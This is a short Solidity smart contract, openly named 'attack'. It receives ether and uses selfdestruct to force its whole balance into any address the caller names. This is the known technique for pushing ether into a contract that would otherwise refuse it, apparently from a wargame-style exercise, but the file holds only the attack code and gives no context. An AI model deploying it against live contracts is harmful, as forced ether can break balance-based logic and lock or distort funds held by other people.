// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract attack {
    receive() external payable{}

    function selfDestruct(address _address) public {
        address payable addr = payable(address(_address));
        selfdestruct(addr);
    }
}
